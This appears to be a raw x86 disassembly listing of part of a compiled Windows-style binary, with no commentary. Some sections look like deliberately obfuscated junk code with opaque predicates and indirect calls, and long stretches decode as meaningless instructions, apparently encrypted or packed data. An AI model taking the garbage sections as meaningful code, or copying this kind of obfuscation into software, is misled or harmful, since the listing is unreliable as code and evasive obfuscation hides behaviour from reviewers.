  40b3a3:	add    DWORD PTR ds:0x4281cb,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x4283e7,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x4281c7,0x4283fb
  40b3c4:	call   0x4220c5
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x4282cb
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x4282fb,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x4282e3,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x42837b
  40b3f3:	mov    eax,ds:0x4282f3
  40b3f8:	cmp    DWORD PTR ds:0x4282fb,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428f3c
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x4281eb,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x4282db
  40b422:	or     DWORD PTR ds:0x42836b,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x4281c7,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x4283f3,0x0
  40b441:	mov    DWORD PTR ds:0x42836b,ecx
  40b447:	mov    DWORD PTR ds:0x4283eb,0x318c
  40b451:	mov    DWORD PTR ds:0x4283fb,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x4282c3,0x461b
  40b46a:	mov    DWORD PTR ds:0x4282ff,0x63d9
  40b474:	cmp    DWORD PTR ds:0x4283f3,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428f40
  40b48f:	xor    edx,DWORD PTR ds:0x4282d3
  40b495:	adc    ecx,DWORD PTR ds:0x4283db
  40b49b:	and    DWORD PTR ds:0x4281cb,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x4282df
  40b4b7:	xor    DWORD PTR ds:0x4283f3,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x4282c3
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x4281df,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x4281bb
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x42828b,0x9f5
  40b501:	mov    DWORD PTR ds:0x428307,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x4281df,0x0
  40b512:	je     0x40b542
  40b518:	push   0x428033
  40b51d:	push   0x400000
  40b522:	call   DWORD PTR ds:0x428e28
  40b528:	sbb    DWORD PTR ds:0x4282f7,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x42822f
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x42841b
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x4281fb
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x4282a3
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x4282d3
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x428303,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x4283db,0x4282a3
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0x26
  40b596:	push   ebx
  40b597:	dec    edi
  40b598:	jle    0x40b5a4
  40b59a:	adc    ebx,DWORD PTR [eax]
  40b59c:	sbb    BYTE PTR [esi+0x12],ch
  40b59f:	sbb    BYTE PTR [eax],bl
  40b5a1:	xchg   esi,esi
  40b5a3:	repz div DWORD PTR [esi]
  40b5a6:	mov    ebx,0xc88239ee
  40b5ab:	mov    edi,DWORD PTR [edi-0x397652ca]
  40b5b1:	call   0x2658:0x989bdcb7
  40b5b8:	cmp    DWORD PTR [edx+0x49],edx
  40b5bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5bc:	leave  
  40b5bd:	outs   dx,BYTE PTR ds:[esi]
  40b5be:	scas   eax,DWORD PTR es:[edi]
  40b5bf:	ins    DWORD PTR es:[edi],dx
  40b5c0:	ds add bh,0xc7
  40b5c4:	sub    BYTE PTR [esi+esi*8+0x62f96b92],bl
  40b5cb:	mov    al,ds:0x8a56aaa7
  40b5d0:	jmp    0x1818b260
  40b5d5:	sar    BYTE PTR [eax-0x52],cl
  40b5d8:	or     esi,DWORD PTR [esi+0x55]
  40b5db:	enter  0xb4c4,0xad
  40b5df:	std    
  40b5e0:	test   DWORD PTR es:[edx-0x69aa7f9d],esp
  40b5e7:	dec    edi
  40b5e8:	push   edi
  40b5e9:	(bad)  
  40b5eb:	mov    ss,WORD PTR ds:0x28ae7ea3
  40b5f1:	mov    ds:0xe2835683,al
  40b5f6:	inc    ebp
  40b5f7:	(bad)  
  40b5f8:	cdq    
  40b5f9:	test   al,0x85
  40b5fb:	and    esp,DWORD PTR [edx-0x68a723a4]
  40b601:	mov    eax,0xb98a73e7
  40b606:	div    esi
  40b608:	inc    ebx
  40b609:	cdq    
  40b60a:	and    DWORD PTR [esi],ecx
  40b60c:	std    
  40b60d:	or     eax,0x5cb96245
  40b612:	xor    al,BYTE PTR [esi]
  40b614:	sbb    al,0x7d
  40b616:	test   eax,0xd8e401df
  40b61b:	dec    esp
  40b61c:	out    0x67,al
  40b61e:	or     ebx,DWORD PTR [ebp+0x1]
  40b621:	loop   0x40b61b
  40b623:	or     al,0x19
  40b625:	add    dl,bl
  40b627:	push   esi
  40b628:	leave  
  40b629:	dec    edi
  40b62a:	push   edi
  40b62b:	jecxz  0x40b600
  40b62d:	mov    eax,ds:0x76f5c8cc
  40b632:	cwde   
  40b633:	or     BYTE PTR [ebx+0x1],0x8c
  40b637:	pushf  
  40b638:	pop    ebx
  40b639:	in     al,0x2d
  40b63b:	call   0xe4152a50
  40b640:	int    0x45
  40b642:	outs   dx,DWORD PTR ds:[esi]
  40b643:	ins    BYTE PTR es:[edi],dx
  40b644:	int3   
  40b645:	les    ecx,FWORD PTR [esi-0x21]
  40b648:	cmp    BYTE PTR [ebp-0x77],ch
  40b64b:	cmc    
  40b64c:	mov    bl,0xd8
  40b64e:	mov    al,0x57
  40b650:	popa   
  40b651:	nop
  40b652:	cld    
  40b653:	call   FWORD PTR [ecx]
  40b655:	push   esp
  40b656:	add    al,0x8f
  40b658:	mov    ecx,0x89175a82
  40b65d:	sbb    dl,BYTE PTR [edx]
  40b65f:	jae    0x40b696
  40b661:	(bad)  
  40b662:	push   ebx
  40b664:	out    0x7e,eax
  40b666:	in     eax,dx
  40b667:	cwde   
  40b668:	mov    eax,0x6d83f04
  40b66d:	sbb    BYTE PTR [ebx+0x5f4f373c],cl
  40b673:	fisttp QWORD PTR [ecx]
  40b675:	fs push cs
  40b677:	cli    
  40b678:	pusha  
  40b679:	jp     0x40b684
  40b67b:	out    dx,al
  40b67c:	jbe    0x40b6e4
  40b67e:	test   ch,al
  40b680:	loope  0x40b60d
  40b682:	jnp    0x40b6a0
  40b684:	xor    BYTE PTR [esp+ebx*1-0x6b534ba4],bh
  40b68b:	pop    es
  40b68c:	jle    0x40b616
  40b68e:	lahf   
  40b68f:	test   al,0xf7
  40b691:	(bad)  
  40b692:	sbb    DWORD PTR [ecx+edi*8],esp
  40b695:	adc    BYTE PTR [esi-0x331a1c27],0xd9
  40b69c:	das    
  40b69d:	adc    ecx,ebx
  40b69f:	lods   eax,DWORD PTR ds:[esi]
  40b6a0:	inc    ebx
  40b6a1:	or     DWORD PTR [edi],edx
  40b6a3:	mov    ebp,0xfba66d0f
  40b6a8:	cmp    esi,DWORD PTR [esi]
  40b6aa:	retf   
  40b6ab:	fs cmc 
  40b6ad:	adc    al,0x90
  40b6af:	mov    edx,0xd20623cc
  40b6b4:	add    esp,DWORD PTR [eax]
  40b6b6:	sub    dh,cl
  40b6b8:	in     eax,0x9a
  40b6ba:	lods   al,BYTE PTR ds:[esi]
  40b6bb:	in     eax,0xff
  40b6bd:	xchg   ebp,ecx
  40b6bf:	jo     0x40b6cb
  40b6c1:	add    BYTE PTR [ebp+0x4cf4b428],al
  40b6c7:	fisttp DWORD PTR [ebx+0x4a50f916]
  40b6cd:	xor    ebp,DWORD PTR [eax+0x39]
  40b6d0:	(bad)  
  40b6d2:	je     0x40b681
  40b6d4:	pop    edi
  40b6d5:	push   edi
  40b6d6:	add    BYTE PTR [eax-0x24a30ae3],ch
  40b6dc:	mov    cl,0xe3
  40b6de:	xchg   edx,eax
  40b6df:	cmp    DWORD PTR [edx],ecx
  40b6e1:	jmp    0x40b6e3
  40b6e3:	cld    
  40b6e4:	outs   dx,DWORD PTR ds:[esi]
  40b6e5:	(bad)  [eax]
  40b6e7:	and    esi,DWORD PTR [edx-0x65]
  40b6ea:	sub    al,0xe0
  40b6ec:	push   ebp
  40b6ed:	fs push 0xebc46dc3
  40b6f3:	in     eax,0x43
  40b6f5:	into   
  40b6f6:	adc    cl,BYTE PTR [ecx+esi*1+0x6]
  40b6fa:	fs pop eax
  40b6fc:	je     0x40b757
  40b6fe:	sbb    BYTE PTR [edi+0x201d5a7a],0x40
  40b705:	and    al,0x15
  40b707:	hlt    
  40b708:	hlt    
  40b709:	and    esp,edx
  40b70b:	in     al,0xaa
  40b70d:	lahf   
  40b70e:	stc    
  40b70f:	lea    eax,[eax-0x80]
  40b712:	mov    ch,0xdd
  40b714:	jp     0x40b6a5
  40b716:	call   0xba6b:0xe8fbba74
  40b71d:	sub    DWORD PTR [edx-0x63],esp
  40b720:	and    DWORD PTR [ecx],eax
  40b722:	jmp    0x40b6b7
  40b724:	pop    ss
  40b725:	jno    0x40b747
  40b727:	arpl   WORD PTR gs:[edi+esi*1+0x199e9697],di
  40b72f:	loope  0x40b72f
  40b731:	pushf  
  40b732:	gs stos DWORD PTR es:[edi],eax
  40b734:	cmp    BYTE PTR [ecx],dh
  40b736:	cmp    al,0x35
  40b738:	mov    edx,0x7cf6720e
  40b73d:	stos   DWORD PTR es:[edi],eax
  40b73e:	mov    ch,0x85
  40b740:	call   0x5b63:0xef2782c6
  40b747:	add    DWORD PTR [edi-0xa],0x19843f46
  40b74e:	mov    esp,0x47d0466c
  40b753:	icebp  
  40b754:	shl    BYTE PTR [edi+edi*8+0x2f70e43c],1
  40b75b:	mov    edi,0x234aaa86
  40b760:	in     al,dx
  40b761:	add    al,0xfc
  40b763:	call   0xe747:0x825434b3
  40b76a:	bound  ebx,QWORD PTR [edx]
  40b76c:	(bad)  
  40b76d:	xchg   ebp,eax
  40b76e:	inc    edx
  40b76f:	dec    esi
  40b770:	aad    0x2b
  40b772:	(bad)  
  40b773:	popf   
  40b774:	imul   ebx,edx,0x22f440cf
  40b77a:	imul   ebp,DWORD PTR ds:0xf8b544f9,0xffffffe0
  40b781:	cmc    
  40b782:	mov    esi,0xbfe85abd
  40b787:	rcl    BYTE PTR [ebx],1
  40b789:	sbb    al,0x4a
  40b78b:	fsub   DWORD PTR [esp+ebp*4]
  40b78e:	stc    
  40b78f:	test   eax,0x543795fc
  40b794:	mov    eax,0xdbad2d26
  40b799:	add    DWORD PTR [edx+0x63ce095d],edx
  40b79f:	mov    edx,0x5cb794b8
  40b7a4:	mul    BYTE PTR [esi+0x846c121]
  40b7aa:	sbb    eax,0x9aa0d47a
  40b7af:	jno    0x40b7d7
  40b7b1:	add    DWORD PTR [edx],ebx
  40b7b3:	call   0x4592:0xcf4b89c4
  40b7ba:	mov    edi,0x2cdfcc48
  40b7bf:	push   esp
  40b7c0:	adc    ch,ah
  40b7c2:	stc    
  40b7c3:	inc    eax
  40b7c4:	xchg   esp,eax
  40b7c5:	sub    eax,DWORD PTR [edi+0x172393bf]
  40b7cb:	(bad)  
  40b7cd:	or     eax,esp
  40b7cf:	cmp    BYTE PTR [ecx-0x21],ah
  40b7d2:	sub    DWORD PTR [edi-0x682fb4f4],0x5f
  40b7d9:	or     ebx,ebp
  40b7db:	dec    edx
  40b7dc:	dec    esi
  40b7dd:	rol    BYTE PTR [esi],cl
  40b7df:	cwde   
  40b7e0:	xchg   esi,eax
  40b7e1:	sti    
  40b7e2:	call   0x3fdf3d1b
  40b7e7:	imul   ebx,DWORD PTR ds:0xf5b8c846,0x3c
  40b7ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7ef:	mov    WORD PTR [edx+eax*2],ds
  40b7f2:	pusha  
  40b7f3:	or     BYTE PTR [ebx-0x2e],al
  40b7f6:	sti    
  40b7f7:	push   ebp
  40b7f8:	addr16 pop edx
  40b7fa:	imul   ebx,DWORD PTR ds:0x257f978e,0xfffffffd
  40b801:	(bad)  
  40b802:	fwait
  40b803:	or     BYTE PTR [esi-0x79],ch
  40b806:	shl    DWORD PTR [eax],0xdf
  40b809:	adc    eax,0xf10e2935
  40b80e:	add    al,0xe5
  40b810:	loope  0x40b833
  40b812:	xchg   BYTE PTR [ebx-0x1b20f69e],cl
  40b818:	(bad)  
  40b819:	popa   
  40b81a:	pop    eax
  40b81b:	sahf   
  40b81c:	mov    ebp,0x60ec9fba
  40b821:	mov    edi,0x31111668
  40b826:	mov    ds:0xa8dcb1f3,eax
  40b82b:	xor    ecx,DWORD PTR [ebx]
  40b82d:	clc    
  40b82e:	inc    ebx
  40b82f:	icebp  
  40b830:	jl     0x40b7fa
  40b832:	and    DWORD PTR gs:[edi-0x6e],ebx
  40b836:	test   ebx,esi
  40b838:	sbb    DWORD PTR [edx],0x65
  40b83b:	jmp    0x40b83b
  40b83d:	sbb    DWORD PTR [eax-0x79],eax
  40b840:	sbb    edx,0x73686c47
  40b846:	add    esi,esi
  40b848:	loop   0x40b816
  40b84a:	adc    ax,0x87e4
  40b84e:	lods   eax,DWORD PTR ds:[esi]
  40b84f:	repnz outs dx,BYTE PTR ds:[esi]
  40b851:	xor    al,0x5b
  40b853:	leave  
  40b854:	inc    bx
  40b856:	call   0xabc78146
  40b85b:	stos   BYTE PTR es:[edi],al
  40b85c:	enter  0xb18d,0x9d
  40b860:	shl    esi,cl
  40b862:	mov    ds,WORD PTR [ebx+eiz*1]
  40b865:	jo     0x40b8a0
  40b867:	mov    bl,0x9a
  40b869:	xor    DWORD PTR [ebp-0x18c166a1],esi
  40b86f:	jg     0x40b8ae
  40b871:	mov    esp,0x85bf95c1
  40b876:	nop
  40b877:	mov    cs,WORD PTR [eax]
  40b879:	into   
  40b87a:	jle    0x40b8b4
  40b87c:	dec    esi
  40b87d:	test   BYTE PTR [eax-0xa90facb],cl
  40b883:	cdq    
  40b884:	and    BYTE PTR [ecx-0x68a418ae],0x65
  40b88b:	bound  eax,QWORD PTR [eax-0xe]
  40b88e:	es inc esi
  40b890:	cvttps2pi mm1,xmm6
  40b893:	outs   dx,DWORD PTR ds:[esi]
  40b894:	cmp    DWORD PTR [esi+ebp*4],edx
  40b897:	push   0xc62cc279
  40b89c:	gs wbinvd 
  40b89f:	pop    es
  40b8a0:	adc    eax,DWORD PTR [ebx+eax*4-0x6e]
  40b8a4:	ja     0x40b85d
  40b8a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8a7:	push   cs
  40b8a8:	stos   BYTE PTR es:[edi],al
  40b8a9:	rol    bl,cl
  40b8ab:	xor    eax,0x268e4f12
  40b8b0:	das    
  40b8b1:	add    eax,0x194d6ebe
  40b8b6:	mov    ds:0x26213cf4,al
  40b8bb:	jae    0x40b853
  40b8bd:	xchg   esi,eax
  40b8be:	inc    ebp
  40b8c0:	fistp  DWORD PTR [ecx+0x2f]
  40b8c3:	xchg   ebx,eax
  40b8c4:	(bad)  
  40b8c5:	push   esp
  40b8c6:	inc    edx
  40b8c7:	bound  ebp,QWORD PTR [ebx-0x47]
  40b8ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8cb:	es scas eax,DWORD PTR es:[edi]
  40b8cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8ce:	dec    esp
  40b8cf:	in     al,dx
  40b8d0:	pop    eax
  40b8d1:	lods   eax,DWORD PTR ds:[esi]
  40b8d2:	ret    0xee4d
  40b8d5:	add    al,0xfa
  40b8d7:	jns    0x40b8a6
  40b8d9:	add    edx,esp
  40b8db:	fdivr  st(3),st
  40b8dd:	xchg   ch,al
  40b8df:	repnz push ebx
  40b8e1:	in     eax,0xf9
  40b8e3:	inc    ecx
  40b8e4:	je     0x40b8de
  40b8e6:	fucom  st(2)
  40b8e8:	stos   BYTE PTR es:[edi],al
  40b8e9:	(bad)
  40b8ec:	adc    BYTE PTR [eax+eax*2+0x3a],ah
  40b8f0:	outs   dx,BYTE PTR ds:[esi]
  40b8f1:	call   0xa19ce266
  40b8f6:	adc    BYTE PTR [ebp-0x32],dh
  40b8f9:	out    dx,eax
  40b8fa:	mov    bh,0xed
  40b8fc:	aaa    
  40b8fd:	mov    edx,0xf678a29c
  40b902:	xor    DWORD PTR [eax-0x3da38347],esp
  40b908:	cmp    cl,BYTE PTR [ecx+eax*2]
  40b90b:	adc    esi,DWORD PTR [ebx+eiz*2-0x5a]
  40b90f:	(bad)  
  40b910:	fsub   QWORD PTR [ebp+ebx*2-0x5e9bdb30]
  40b917:	out    dx,eax
  40b918:	push   es
  40b919:	(bad)  
  40b91a:	jl     0x40b8d6
  40b91c:	int    0x31
  40b91e:	sahf   
  40b91f:	push   ebx
  40b920:	mov    bl,0xbf
  40b922:	cwde   
  40b923:	push   0x5f
  40b925:	mov    al,ds:0x2762b767
  40b92a:	out    dx,al
  40b92b:	cmp    DWORD PTR [eax+0x23cb4aaa],esi
  40b931:	mov    ch,0x27
  40b933:	jg     0x40b97a
  40b935:	add    eax,eax
  40b937:	xchg   DWORD PTR [eax],esp
  40b939:	dec    edi
  40b93a:	cdq    
  40b93b:	mov    ds,WORD PTR [ebx]
  40b93d:	pop    esi
  40b93e:	cmp    ah,BYTE PTR [edx+edi*1]
  40b941:	jecxz  0x40b8ef
  40b943:	std    
  40b944:	mov    bh,0x75
  40b946:	js     0x40b8fc
  40b948:	mov    esp,0xb5025a7f
  40b94d:	jbe    0x40b995
  40b94f:	sbb    eax,0x473812a2
  40b954:	add    BYTE PTR [eax+0x5316b804],al
  40b95a:	jl     0x40b9cb
  40b95c:	std    
  40b95d:	(bad)  
  40b95e:	mov    esi,0x23539774
  40b963:	sub    eax,0xad849883
  40b968:	inc    ecx
  40b969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b96a:	ja     0x40b955
  40b96c:	cld    
  40b96d:	xor    al,BYTE PTR [esi]
  40b96f:	sbb    al,BYTE PTR [ebp+0x66]
  40b972:	sbb    al,0xca
  40b974:	sar    DWORD PTR [eax-0x4edb2b10],cl
  40b97a:	add    eax,0x355c
  40b97f:	adc    ecx,0x819
  40b985:	adc    DWORD PTR ds:0x428353,0xc1d
  40b98f:	or     eax,edx
  40b991:	mov    edx,DWORD PTR [ebp-0x10]
  40b994:	or     ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x4282d7
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x428367,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x42836f,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x4282d7,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x42836f,0x2492
  40b9d2:	mov    DWORD PTR ds:0x4283ff,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x42836f,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428e2c
  40b9f7:	adc    DWORD PTR ds:0x4283fb,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x428357
  40ba0a:	sub    edx,DWORD PTR ds:0x42836b
  40ba10:	mov    DWORD PTR ds:0x428357,edx
  40ba16:	adc    DWORD PTR ds:0x428353,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x4281c7
  40ba26:	xor    DWORD PTR ds:0x4283f3,edx
  40ba2c:	or     DWORD PTR ds:0x42829f,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x4282d7
  40ba3c:	or     DWORD PTR ds:0x428373,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	mov    esp,0x60705fa8
  40baa8:	or     eax,0x126e1818
  40baad:	sbb    BYTE PTR [eax],bl
  40baaf:	out    dx,al
  40bab0:	and    DWORD PTR [ecx],edi
  40bab2:	cs push edx
  40bab4:	(bad)  
  40bab5:	imul   ecx,DWORD PTR [ebx-0x4092fadc],0x1a
  40babc:	int3   
  40babd:	stos   DWORD PTR es:[edi],eax
  40babe:	push   ebx
  40babf:	cmp    edx,ecx
  40bac1:	dec    ebp
  40bac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bac3:	mov    edx,0xbf37b82b
  40bac8:	lahf   
  40bac9:	daa    
  40baca:	shr    BYTE PTR [esi+0x90ea7f1],1
  40bad0:	mov    al,ds:0x3a0e726e
  40bad5:	out    0xc7,eax
  40bad7:	es fdivr st,st(7)
  40bada:	xchg   ebx,eax
  40badb:	push   ss
  40badc:	mov    dl,0x6a
  40bade:	jno    0x40bb5e
  40bae0:	fdivr  st(4),st
  40bae2:	jg     0x40baa2
  40bae4:	and    al,BYTE PTR [esi]
  40bae6:	pop    edx
  40bae7:	sub    esi,DWORD PTR [edi-0x48d7fd03]
  40baed:	mov    esp,0xedc1c4b9
  40baf2:	aas    
  40baf3:	icebp  
  40baf4:	mov    ?,WORD PTR [edx+0x5c648e88]
  40bafa:	and    BYTE PTR ds:0x18a60f1f,0x3f
  40bb01:	inc    ecx
  40bb02:	fcomip st,st(5)
  40bb04:	pop    ebx
  40bb05:	xor    BYTE PTR [ecx+eax*1+0x50],0xea
  40bb0a:	rcr    BYTE PTR [esi+0x7d407a70],cl
  40bb10:	add    BYTE PTR [esi-0xa],cl
  40bb13:	cdq    
  40bb14:	sbb    BYTE PTR [ebx-0x6de78097],ch
  40bb1a:	push   0x3f1f82aa
  40bb1f:	jno    0x40bb60
  40bb21:	lds    esp,FWORD PTR [ecx]
  40bb23:	mov    al,ds:0x8e468c6c
  40bb28:	cmp    cl,BYTE PTR [eax+0x6bfbf15a]
  40bb2e:	pop    gs
  40bb30:	pop    ds
  40bb31:	xchg   esp,eax
  40bb32:	pop    ebp
  40bb33:	sub    eax,0xe0ff2ce8
  40bb38:	push   eax
  40bb39:	pushf  
  40bb3a:	dec    eax
  40bb3b:	fidivr WORD PTR [ecx]
  40bb3d:	or     ebp,esi
  40bb3f:	ror    al,0xfd
  40bb42:	inc    esi
  40bb43:	jmp    0x40bb00
  40bb45:	clc    
  40bb46:	inc    edx
  40bb47:	xor    BYTE PTR [ebp-0x42],bh
  40bb4a:	sub    al,0x4c
  40bb4c:	and    al,0xeb
  40bb4e:	mov    ah,0xf8
  40bb50:	ss push edi
  40bb52:	retf   
  40bb53:	dec    edi
  40bb54:	mov    ecx,0x980f66b8
  40bb59:	loope  0x40bb62
  40bb5b:	cwde   
  40bb5c:	enter  0xe29a,0x66
  40bb60:	jle    0x40bbac
  40bb62:	cmc    
  40bb63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb64:	mov    ch,0x2d
  40bb66:	add    eax,0x77fa44d6
  40bb6b:	mov    WORD PTR [edx-0x2b],fs
  40bb6e:	push   ecx
  40bb6f:	inc    esi
  40bb70:	test   ecx,0x47f0f2f3
  40bb76:	lea    ebp,[ecx]
  40bb78:	(bad)  
  40bb79:	and    edi,DWORD PTR [eax]
  40bb7b:	fmul   st(0),st
  40bb7d:	mov    bl,0xbd
  40bb7f:	adc    eax,DWORD PTR [ebp-0x37]
  40bb82:	push   ss
  40bb83:	jb     0x40bb48
  40bb85:	sub    ecx,ebp
  40bb87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb88:	repz add al,0x87
  40bb8b:	inc    ebx
  40bb8c:	mov    dl,0xdc
  40bb8e:	imul   ebp,ecx,0x9b9707d7
  40bb94:	adc    BYTE PTR [edx+0x6d],ah
  40bb97:	fwait
  40bb98:	(bad)  
  40bb99:	aas    
  40bb9a:	rol    ah,cl
  40bb9c:	sub    al,0xe5
  40bb9e:	add    BYTE PTR [ecx+0x587461f0],al
  40bba4:	ins    BYTE PTR es:[edi],dx
  40bba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bba6:	mov    dl,0xde
  40bba8:	icebp  
  40bba9:	mov    ch,0xcd
  40bbab:	adc    al,BYTE PTR [eax+0x102e5374]
  40bbb1:	sahf   
  40bbb2:	mov    bl,bh
  40bbb4:	rol    DWORD PTR [edx+0x404c4d1b],1
  40bbba:	ds xchg edi,eax
  40bbbc:	mov    ds:0x233d2be2,al
  40bbc1:	cli    
  40bbc2:	sbb    esi,DWORD PTR [eax+0x6b1b281f]
  40bbc8:	or     eax,0x46dfa329
  40bbcd:	mov    al,0xdc
  40bbcf:	mov    ds:0x3a934559,eax
  40bbd4:	dec    esp
  40bbd5:	push   ebp
  40bbd6:	nop
  40bbd7:	test   eax,0xe43aa97b
  40bbdc:	arpl   WORD PTR [ebx+0x6c5fccea],ax
  40bbe2:	or     DWORD PTR [edi+0x77],ebx
  40bbe5:	xor    eax,0xe45b8acc
  40bbea:	les    eax,FWORD PTR [esi]
  40bbec:	xchg   esp,eax
  40bbed:	jle    0x40bbd0
  40bbef:	(bad)  
  40bbf0:	stos   DWORD PTR es:[edi],eax
  40bbf1:	xchg   esi,eax
  40bbf2:	arpl   WORD PTR [ebx+eiz*8],di
  40bbf5:	ss sub eax,0xcf9dd39f
  40bbfb:	shl    DWORD PTR [edi+esi*2+0x40],0x3d
  40bc00:	jnp    0x40bc77
  40bc02:	inc    edx
  40bc03:	sub    edi,ebp
  40bc05:	(bad)
  40bc0a:	ins    BYTE PTR es:[edi],dx
  40bc0b:	mov    cl,BYTE PTR [ebx-0x66]
  40bc0e:	(bad)  
  40bc0f:	shl    BYTE PTR [edx+0x3c],1
  40bc12:	sbb    BYTE PTR [ebp-0xf],0xb7
  40bc16:	or     DWORD PTR [ebx+eiz*1+0x45b629b2],ebx
  40bc1d:	xchg   ebx,eax
  40bc1e:	mov    edx,0x305fa58a
  40bc23:	dec    ecx
  40bc24:	adc    eax,0x7215f1c5
  40bc29:	pop    ebp
  40bc2a:	inc    eax
  40bc2b:	mov    ebx,0xae95ab55
  40bc30:	hlt    
  40bc31:	out    dx,eax
  40bc32:	xlat   BYTE PTR ds:[ebx]
  40bc33:	in     al,0xbd
  40bc35:	jbe    0x40bbee
  40bc37:	push   ebx
  40bc38:	mov    edi,0x9d39bd46
  40bc3d:	mov    ebx,0xbc51a1e3
  40bc42:	ins    BYTE PTR es:[edi],dx
  40bc43:	and    eax,0x2386f83e
  40bc48:	add    dl,ah
  40bc4a:	out    dx,al
  40bc4b:	fcomp  DWORD PTR [esp+edx*1+0x15]
  40bc4f:	popf   
  40bc50:	ds scas al,BYTE PTR es:[edi]
  40bc52:	cmp    eax,0x76f8fc19
  40bc57:	sti    
  40bc58:	pop    ebp
  40bc59:	xchg   edx,eax
  40bc5a:	pop    eax
  40bc5b:	xchg   esp,eax
  40bc5c:	jg     0x40bcd6
